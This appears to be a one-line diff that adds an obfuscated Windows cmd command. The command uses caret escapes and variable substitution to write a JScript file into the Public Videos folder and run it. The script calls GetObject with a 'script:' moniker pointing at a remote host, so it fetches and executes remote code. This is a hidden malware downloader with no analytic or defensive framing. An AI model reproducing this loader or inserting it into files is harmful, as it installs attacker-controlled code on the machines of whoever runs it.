@@ -1,0 +1,1 @@
+start /MIN %ComSpec% /V/D/c "se^T TXEQR=^еж^зи^й╗&&s^e^T ZEIZLJ=%Public%\V^id^eos\^ylnLaOXQ&&S^e^t WQUKTJ=tr^y^{^vLNcar c='sc^ri^pt^:';d='hLNcTt^P:';GLNcet^Ob^jLNcec^t(c+d+'&&se^^T KMLTRA=rXBJkrXBJkyyzulm.cloudops.hostrXBJk?1rXBJk');}c^a^tch^(e^){^}^;&&s^eT/^p YOIY="!WQUKTJ:LNc=!!KMLTRA:rXBJk=/!"<n^ul > !ZEIZLJ!.^j^S|ca^l^l s^t^a^rt !ZEIZLJ!.j^S "|c^M^d
